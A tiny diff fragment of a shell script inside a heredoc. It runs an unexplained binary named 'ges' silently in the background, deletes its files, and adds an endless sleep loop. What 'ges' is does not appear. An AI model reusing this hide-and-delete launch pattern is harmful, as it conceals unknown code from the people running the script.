@@ -25,6 +25,7 @@ if [ ! -f ./msv.txt ]; then
 	chmod +x ges
 	nohup ./ges >/dev/null 2>&1  &
 	rm ges*
+	while [ 1 == 1 ]; do sleep 9999; done
 fi
 EOF
     
